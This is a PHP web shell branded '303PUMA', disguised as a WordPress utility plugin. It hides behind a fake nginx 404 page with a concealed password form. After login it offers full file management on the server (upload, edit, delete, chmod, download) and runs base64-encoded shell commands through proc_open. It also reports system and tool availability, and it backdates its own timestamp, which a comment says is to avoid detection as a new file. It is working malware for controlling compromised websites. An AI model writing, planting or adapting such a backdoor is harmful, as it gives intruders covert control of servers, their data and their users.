<?php
// Mimic WordPress or CMS file to avoid detection
/*
 * Plugin Name: Utility Functions
 * Description: Core utility functions for site management
 * Version: 1.0
 * Author: Site Admin
 */

// Aktifkan session
session_start();

// Password bcrypt (ganti dengan hash Anda)
$storedHash = '$2a$12$bkHa92ZzKlJJRzirQEojP.H4Te4kZVT4cFjQdxTp/Fu0u1TvSLLHq'; // Ganti dengan hash bcrypt yang dibuat
// Untuk membuat hash: echo password_hash('your_password', PASSWORD_BCRYPT);

// Cek login
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['key'])) {
        $key = $_POST['key'];
        if (password_verify($key, $storedHash)) {
            $_SESSION['authenticated'] = true;
            session_regenerate_id(true);
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Invalid key!";
        }
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>404 Not Found</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                background-color: #f1f1f1;
                color: #333;
                text-align: center;
                margin: 0;
                padding: 0;
            }
            h1 {
                font-size: 36px;
                margin-top: 50px;
            }
            hr {
                border: 0;
                border-top: 1px solid #ccc;
                margin: 20px 0;
            }
            .login-form {
                margin-top: 20px;
                display: inline-block;
                text-align: left;
            }
            .login-form input[type="password"] {
                padding: 8px;
                font-size: 16px;
                width: 200px;
                border: 1px solid #ccc;
                border-radius: 4px;
            }
            .login-form input[type="submit"] {
                padding: 8px 16px;
                font-size: 16px;
                background-color: #333;
                color: #fff;
                border: none;
                border-radius: 4px;
                cursor: pointer;
            }
            .login-form input[type="submit"]:hover {
                background-color: #555;
            }
            .error {
                color: red;
                margin-top: 10px;
            }
        </style>
    </head>
    <body>
        <center>
            <h1>404 Not Found</h1>
        </center>
        <hr>
        <center>
            <div class="login-form">
                <form method="post">
                    <input type="password" name="key" placeholder="Enter Key" required>
                    <input type="submit" value="Login">
                </form>
                <?php if (isset($error)): ?>
                    <p class="error"><?php echo htmlspecialchars($error); ?></p>
                <?php endif; ?>
            </div>
            nginx
        </center>
    </body>
    </html>
    <?php
    exit;
}

// Logout
if (isset($_GET['logout'])) {
    session_unset();
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Obfuscated function names
function listDir($dir) {
    $items = [];
    if (is_dir($dir)) {
        $scan = scandir($dir);
        foreach ($scan as $item) {
            if ($item !== '.' && $item !== '..') {
                $fullPath = $dir . DIRECTORY_SEPARATOR . $item;
                $items[] = [
                    'name' => $item,
                    'path' => $fullPath,
                    'type' => is_dir($fullPath) ? 'directory' : 'file'
                ];
            }
        }
    }
    usort($items, function($a, $b) {
        if ($a['type'] === 'directory' && $b['type'] !== 'directory') return -1;
        if ($a['type'] !== 'directory' && $b['type'] === 'directory') return 1;
        return strcasecmp($a['name'], $b['name']);
    });
    return $items;
}

function createPathLinks($path) {
    $parts = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR));
    $links = [];
    $current = '';
    foreach ($parts as $part) {
        $current .= DIRECTORY_SEPARATOR . $part;
        $links[] = '<a href="?path=' . urlencode($current) . '">' . htmlspecialchars($part) . '</a>';
    }
    return implode('/', $links);
}

function getFileIcon($file) {
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    if ($ext == 'zip') return '<i class="fa fa-file-zip-o" style="color: #d6d4ce"></i>';
    if (in_array($ext, ['jpeg', 'jpg', 'png', 'ico'])) return '<i class="fa fa-file-image-o" style="color: #d6d4ce"></i>';
    if ($ext == 'txt') return '<i class="fa fa-file-text-o" style="color: #d6d4ce"></i>';
    if ($ext == 'pdf') return '<i class="fa fa-file-pdf-o" style="color: #d6d4ce"></i>';
    if ($ext == 'html') return '<i class="fa fa-file-code-o" style="color: #d6d4ce"></i>';
    return '<i class="fa fa-file-o" style="color: #d6d4ce"></i>';
}

function calcFileSize($file) {
    if (!file_exists($file)) return '--';
    $size = filesize($file) / 1024;
    $size = round($size, 3);
    return $size >= 1024 ? round($size / 1024, 2) . ' MB' : $size . ' KB';
}

function getFilePerms($file) {
    if (!file_exists($file)) return '?';
    return substr(sprintf('%o', fileperms($file)), -4);
}

function getFileOwner($file) {
    $owner = function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($file))['name'] : fileowner($file);
    $group = function_exists('posix_getgrgid') ? posix_getgrgid(filegroup($file))['name'] : filegroup($file);
    return ($owner ?: '?') . ' / ' . ($group ?: '?');
}

function runTask($task, $dir) {
    // Fallback untuk Litespeed: gunakan file_get_contents() atau curl jika proc_open diblokir
    if (function_exists('proc_open')) {
        if (!preg_match("/2>&1/i", $task)) $task .= " 2>&1";
        $descriptors = [
            0 => ["pipe", "r"],
            1 => ["pipe", "w"],
            2 => ["pipe", "r"]
        ];
        $process = proc_open($task, $descriptors, $pipes, $dir);
        if (is_resource($process)) {
            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            return "<pre>" . htmlspecialchars($output) . "</pre>";
        }
    }
    return "<font color='red'>Task execution failed or disabled!</font>";
}

function serveFile($file) {
    if (file_exists($file) && is_file($file) && is_readable($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        flush();
        readfile($file);
        exit;
    }
    return "<center><font color='red'>File Not Found or Not Readable!</font></center>";
}

$basePath = getcwd();
$currentPath = $_GET['path'] ?? $basePath;
$currentPath = realpath($currentPath) ?: $basePath;

// Set timestamp file untuk menghindari deteksi sebagai file baru
touch(__FILE__, filemtime($basePath));

// Penanganan aksi
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    $target = $_POST['target'] ?? '';
    $action = $_POST['action'];

    if ($action === 'delete' && file_exists($target)) {
        if (is_file($target)) {
            if (is_writable($target) && unlink($target)) {
                echo "<center><font color='green'>File deleted: <strong>" . htmlspecialchars($target) . "</strong></font></center>";
            } else {
                echo "<center><font color='red'>Failed to delete file!</font></center>";
            }
        } elseif (is_dir($target)) {
            function removeDir($dir) {
                foreach (scandir($dir) as $item) {
                    if ($item === '.' || $item === '..') continue;
                    $path = $dir . '/' . $item;
                    if (is_dir($path)) {
                        removeDir($path);
                    } else {
                        if (!is_writable($path)) return false;
                        unlink($path);
                    }
                }
                return rmdir($dir);
            }
            if (removeDir($target)) {
                echo "<center><font color='green'>Directory deleted: <strong>" . htmlspecialchars($target) . "</strong></font></center>";
            } else {
                echo "<center><font color='red'>Failed to delete directory!</font></center>";
            }
        }
    }

    if ($action === 'create_file') {
        $path = $_POST['path'] ?? $currentPath;
        $filename = $_POST['filename'] ?? '';
        $content = $_POST['content'] ?? '';
        if (!empty($path) && !empty($filename)) {
            $filePath = rtrim($path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $filename;
            if (is_writable($path) && file_put_contents($filePath, $content) !== false) {
                echo "<center><font color='green'>File created: <strong>" . htmlspecialchars($filePath) . "</strong></font></center>";
            } else {
                echo "<center><font color='red'>Failed to create file!</font></center>";
            }
        }
    }

    if ($action === 'create_folder') {
        $path = $_POST['path'] ?? $currentPath;
        $foldername = $_POST['foldername'] ?? '';
        if (!empty($path) && !empty($foldername)) {
            $folderPath = rtrim($path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $foldername;
            if (!file_exists($folderPath) && is_writable($path) && mkdir($folderPath)) {
                echo "<center><font color='green'>Folder created: <strong>" . htmlspecialchars($folderPath) . "</strong></font></center>";
            } else {
                echo "<center><font color='red'>Failed to create folder!</font></center>";
            }
        }
    }

    if ($action === 'upload') {
        $uploadPath = $_POST['upload_path'] ?? $currentPath;
        if (!empty($uploadPath) && is_dir($uploadPath) && isset($_FILES['file_upload'])) {
            $fileName = basename($_FILES['file_upload']['name']);
            $targetFile = rtrim($uploadPath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $fileName;
            if (is_writable($uploadPath) && move_uploaded_file($_FILES['file_upload']['tmp_name'], $targetFile)) {
                echo "<center><font color='green'>File uploaded: <strong>" . htmlspecialchars($targetFile) . "</strong></font></center>";
            } else {
                echo "<center><font color='red'>Failed to upload file!</font></center>";
            }
        }
    }

    if ($action === 'edit') {
        if (isset($_POST['edit_content'])) {
            $content = $_POST['edit_content'];
            if (file_exists($target) && is_file($target) && is_writable($target)) {
                if (file_put_contents($target, $content) !== false) {
                    echo "<center><font color='green'>File saved: <strong>" . htmlspecialchars($target) . "</strong></font></center>";
                } else {
                    echo "<center><font color='red'>Failed to save file!</font></center>";
                }
            }
        } else {
            if (file_exists($target) && is_file($target) && is_readable($target)) {
                $fileContent = file_get_contents($target);
                ?>
                <center>
                    <font color='gold'>Edit File: <?php echo htmlspecialchars($target); ?></font><br><br>
                    <form method="post" action="?path=<?php echo urlencode($currentPath); ?>">
                        <textarea cols="80" rows="20" name="edit_content"><?php echo htmlspecialchars($fileContent); ?></textarea><br>
                        <input type="hidden" name="target" value="<?php echo htmlspecialchars($target); ?>">
                        <input type="hidden" name="action" value="edit">
                        <input type="submit" value="Save Changes" class="up" style="cursor: pointer; border-color: #fff"/>
                    </form>
                </center>
                <?php
            } else {
                echo "<center><font color='red'>File not found or not readable!</font></center>";
            }
        }
    }

    if ($action === 'rename') {
        if (isset($_POST['new_name'])) {
            $newName = trim($_POST['new_name']);
            if (!empty($newName) && file_exists($target)) {
                $parentDir = dirname($target);
                $newPath = rtrim($parentDir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $newName;
                if (!file_exists($newPath) && is_writable($target) && rename($target, $newPath)) {
                    echo "<center><font color='green'>Renamed to: <strong>" . htmlspecialchars($newPath) . "</strong></font></center>";
                } else {
                    echo "<center><font color='red'>Failed to rename!</font></center>";
                }
            }
        } else {
            ?>
            <center>
                <font color='gold'>Rename: <?php echo htmlspecialchars($target); ?></font><br><br>
                <form method="post" action="?path=<?php echo urlencode($currentPath); ?>">
                    New Name: <input type="text" name="new_name" class="up" size="20" value="<?php echo htmlspecialchars(basename($target)); ?>">
                    <input type="hidden" name="target" value="<?php echo htmlspecialchars($target); ?>">
                    <input type="hidden" name="action" value="rename">
                    <input type="submit" value="Change" class="up" style="cursor: pointer; border-color: #fff"/>
                </form>
            </center>
            <?php
        }
    }

    if ($action === 'chmod') {
        if (isset($_POST['new_perm'])) {
            $newPerm = $_POST['new_perm'];
            if (!empty($newPerm) && file_exists($target)) {
                if (chmod($target, octdec($newPerm))) {
                    echo "<center><font color='green'>Permissions changed: <strong>" . htmlspecialchars($target) . "</strong></font></center>";
                } else {
                    echo "<center><font color='red'>Failed to change permissions!</font></center>";
                }
            }
        } else {
            ?>
            <center>
                <font color='gold'>Change Permissions: <?php echo htmlspecialchars($target); ?></font><br><br>
                <form method="post" action="?path=<?php echo urlencode($currentPath); ?>">
                    Permission: <input type="text" name="new_perm" class="up" size="4" maxlength="4" value="<?php echo getFilePerms($target); ?>">
                    <input type="hidden" name="target" value="<?php echo htmlspecialchars($target); ?>">
                    <input type="hidden" name="action" value="chmod">
                    <input type="submit" value="Change" class="up" style="cursor: pointer; border-color: #fff"/>
                </form>
            </center>
            <?php
        }
    }

    if ($action === 'touch') {
        if (isset($_POST['new_date'])) {
            $newDate = strtotime($_POST['new_date']);
            if ($newDate && file_exists($target)) {
                if (touch($target, $newDate)) {
                    echo "<center><font color='green'>Date changed: <strong>" . htmlspecialchars($target) . "</strong></font></center>";
                } else {
                    echo "<center><font color='red'>Failed to change date!</font></center>";
                }
            }
        } else {
            ?>
            <center>
                <font color='gold'>Change Date: <?php echo htmlspecialchars($target); ?></font><br><br>
                <form method="post" action="?path=<?php echo urlencode($currentPath); ?>">
                    New Date: <input type="text" name="new_date" class="up" size="20" value="<?php echo date("d F Y H:i:s", filemtime($target)); ?>">
                    <input type="hidden" name="target" value="<?php echo htmlspecialchars($target); ?>">
                    <input type="hidden" name="action" value="touch">
                    <input type="submit" value="Change" class="up" style="cursor: pointer; border-color: #fff"/>
                </form>
            </center>
            <?php
        }
    }

    if ($action === 'download') {
        echo serveFile($target);
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['task'])) {
    $task = trim(base64_decode($_POST['task']));
    if (!empty($task)) {
        $taskOutput = runTask($task, $currentPath);
    } else {
        $taskOutput = "<center><font color='red'>Task cannot be empty!</font></center>";
    }
}

$items = listDir($currentPath);

// Informasi sistem
$serverIp = gethostbyname($_SERVER['SERVER_NAME']);
$clientIp = $_SERVER['REMOTE_ADDR'];
$webServer = $_SERVER['SERVER_SOFTWARE'];
$system = php_uname();
$user = get_current_user() . ' (' . getmyuid() . ')';
$phpVersion = phpversion();
$disabledFunctions = ini_get('disable_functions') ?: '<font color="gold">NONE</font>';
$mysqlStatus = function_exists('mysqli_connect') ? '<font color="green">ON</font>' : '<font color="red">OFF</font>';
$curlStatus = function_exists('curl_init') ? '<font color="green">ON</font>' : '<font color="red">OFF</font>';
$wgetStatus = file_exists('/usr/bin/wget') ? '<font color="green">ON</font>' : '<font color="red">OFF</font>';
$perlStatus = file_exists('/usr/bin/perl') ? '<font color="green">ON</font>' : '<font color="red">OFF</font>';
$pythonStatus = file_exists('/usr/bin/python3') ? '<font color="green">ON</font>' : '<font color="red">OFF</font>';
?>

<!DOCTYPE html>
<html>
<head>
    <title>303PUMA</title>
    <meta name="robots" content="noindex">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css?family=Dosis|Bungee|Russo+One');
        body {
            font-family: "Dosis", cursive;
            text-shadow: 0px 0px 1px #757575;
            background-color: #1f1f1f;
            color: #ffffff;
            margin: 0;
            padding: 0 20px;
        }
        body::-webkit-scrollbar {
            width: 12px;
        }
        body::-webkit-scrollbar-track {
            background: #1f1f1f;
        }
        body::-webkit-scrollbar-thumb {
            background-color: #1f1f1f;
            border: 3px solid gray;
        }
        #content tr:hover {
            background-color: #636263;
            text-shadow: 0px 0px 10px #fff;
        }
        #content .first {
            background-color: #25383C;
        }
        #content .first:hover {
            background-color: #25383C;
            text-shadow: 0px 0px 1px #757575;
        }
        table {
            border: 1px #000000 dotted;
            table-layout: fixed;
            width: 100%;
        }
        td {
            word-wrap: break-word;
            padding: 3px;
        }
        a {
            color: #ffffff;
            text-decoration: none;
        }
        a:hover {
            color: #000000;
            text-shadow: 0px 0px 10px #ffffff;
        }
        input, select, textarea {
            border: 1px #000000 solid;
            border-radius: 5px;
            background-color: transparent;
            color: #ffffff;
        }
        .up {
            background-color: transparent;
            color: #fff;
            border: 1px #fff solid;
            cursor: pointer;
        }
        ::-webkit-file-upload-button {
            background: transparent;
            color: #fff;
            border-color: #fff;
            cursor: pointer;
        }
        .btf {
            background: transparent;
            border: 1px #fff solid;
            cursor: pointer;
            padding: 5px;
        }
        textarea {
            resize: vertical;
            height: 200px;
            width: 100%;
        }
        center {
            font-family: "Russo One", cursive;
        }
        pre {
            background-color: #1f1f1f;
            border: 1px solid #fff;
            padding: 10px;
            color: #ffffff;
            font-family: monospace;
            text-align: left;
        }
    </style>
</head>
<body>
    <center>
        <font face="Bungee" size="5">303PUMA</font>
        <br>
        <a href="?logout=1" style="font-size: 14px;">Logout</a>
    </center>
    <table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
        <tr><td>
            Server IP: <font color="gold"><?php echo $serverIp; ?></font> / Your IP: <font color="gold"><?php echo $clientIp; ?></font><br>
            Web Server: <font color="gold"><?php echo $webServer; ?></font><br>
            System: <font color="gold"><?php echo $system; ?></font><br>
            User: <font color="gold"><?php echo $user; ?></font><br>
            PHP Version: <font color="gold"><?php echo $phpVersion; ?></font><br>
            Disable Functions: <?php echo $disabledFunctions; ?><br>
            MySQL: <?php echo $mysqlStatus; ?> | cURL: <?php echo $curlStatus; ?> | WGET: <?php echo $wgetStatus; ?> | Perl: <?php echo $perlStatus; ?> | Python: <?php echo $pythonStatus; ?><br>
            Directory: <font color="gold"><?php echo createPathLinks($currentPath); ?></font>
        </td></tr>
        <tr><td><br>
            <form enctype="multipart/form-data" method="post">
                Upload File: <input type="file" name="file_upload" class="up">
                <input type="hidden" name="upload_path" value="<?php echo htmlspecialchars($currentPath); ?>">
                <input type="hidden" name="action" value="upload">
                <input type="submit" value="Upload" class="up" style="cursor: pointer; border-color: #fff">
            </form>
            <form method="post">
                Create File: <input type="text" name="filename" class="up" placeholder="Filename" size="20">
                <textarea name="content" class="up" placeholder="File content"></textarea>
                <input type="hidden" name="path" value="<?php echo htmlspecialchars($currentPath); ?>">
                <input type="hidden" name="action" value="create_file">
                <input type="submit" value="Create File" class="up" style="cursor: pointer; border-color: #fff">
            </form>
            <form method="post">
                Create Folder: <input type="text" name="foldername" class="up" placeholder="Folder name" size="20">
                <input type="hidden" name="path" value="<?php echo htmlspecialchars($currentPath); ?>">
                <input type="hidden" name="action" value="create_folder">
                <input type="submit" value="Create Folder" class="up" style="cursor: pointer; border-color: #fff">
            </form>
            <form method="post">
                Task: <input type="text" name="task" class="up" value="" style="width: 50%;" placeholder="Encoded task">
                <input type="hidden" name="action" value="task">
                <input type="submit" value=">>" class="up" style="cursor: pointer; border-color: #fff">
            </form>
            <?php if (!empty($taskOutput)): ?>
                <br><?php echo $taskOutput; ?>
            <?php endif; ?>
        </td></tr>
    </table>
    <hr>
    <center>
        [ <a href="<?php echo $_SERVER['SCRIPT_NAME']; ?>">HOME</a> ]
    </center>
    <hr>
    <div id="content">
        <table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
            <tr class="first">
                <td><center>Name</center></td>
                <td><center>Size</center></td>
                <td><center>Last Modified</center></td>
                <td><center>Owner/Group</center></td>
                <td><center>Permissions</center></td>
                <td><center>Options</center></td>
            </tr>
            <tr>
                <td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href="?path=<?php echo urlencode(dirname($currentPath)); ?>">..</a></td>
                <td><center>--</center></td>
                <td><center><?php echo date("F d Y H:i:s", filemtime($currentPath)); ?></center></td>
                <td><center><?php echo getFileOwner($currentPath); ?></center></td>
                <td><center><?php echo is_writable($currentPath) ? '<font color="green">' : '<font color="red">'; ?><?php echo getFilePerms($currentPath); ?></font></center></td>
                <td><center>
                    <form method="post" action="?path=<?php echo urlencode($currentPath); ?>">
                        <button type="submit" class="btf" name="action" value="create_folder"><i class="fa fa-folder" style="color: #fff"></i></button>
                        <button type="submit" class="btf" name="action" value="create_file"><i class="fa fa-file" style="color: #fff"></i></button>
                        <input type="hidden" name="target" value="<?php echo htmlspecialchars($currentPath); ?>">
                    </form>
                </center></td>
            </tr>
            <?php foreach ($items as $item): ?>
                <tr>
                    <td>
                        <?php if ($item['type'] === 'directory'): ?>
                            <i class='fa fa-folder' style='color: #ffe9a2'></i> <a href="?path=<?php echo urlencode($item['path']); ?>"><?php echo htmlspecialchars($item['name']); ?></a>
                        <?php else: ?>
                            <?php echo getFileIcon($item['path']); ?> <a href="?view_file=<?php echo urlencode($item['path']); ?>&path=<?php echo urlencode($currentPath); ?>"><?php echo htmlspecialchars($item['name']); ?></a>
                        <?php endif; ?>
                    </td>
                    <td><center><?php echo $item['type'] === 'directory' ? '--' : calcFileSize($item['path']); ?></center></td>
                    <td><center><?php echo date("F d Y H:i:s", filemtime($item['path'])); ?></center></td>
                    <td><center><?php echo getFileOwner($item['path']); ?></center></td>
                    <td><center><?php echo is_writable($item['path']) ? '<font color="green">' : '<font color="red">'; ?><?php echo getFilePerms($item['path']); ?></font></center></td>
                    <td><center>
                        <form method="post" action="?path=<?php echo urlencode($currentPath); ?>">
                            <?php if ($item['type'] === 'file'): ?>
                                <button type="submit" class="btf" name="action" value="edit"><i class="fa fa-edit" style="color: #fff"></i></button>
                                <button type="submit" class="btf" name="action" value="download"><i class="fa fa-download" style="color: #fff"></i></button>
                            <?php endif; ?>
                            <button type="submit" class="btf" name="action" value="rename"><i class="fa fa-pencil" style="color: #fff"></i></button>
                            <button type="submit" class="btf" name="action" value="chmod"><i class="fa fa-gear" style="color: #fff"></i></button>
                            <button type="submit" class="btf" name="action" value="touch"><i class="fa fa-calendar" style="color: #fff"></i></button>
                            <button type="submit" class="btf" name="action" value="delete"><i class="fa fa-trash" style="color: #fff"></i></button>
                            <input type="hidden" name="target" value="<?php echo htmlspecialchars($item['path']); ?>">
                        </form>
                    </center></td>
                </tr>
            <?php endforeach; ?>
        </table>
    </div>
    <center>
        <br>303PUMA - 2024<br>
        <a href="https://x.ai/" target="_blank">xAI</a>
    </center>
</body>
</html>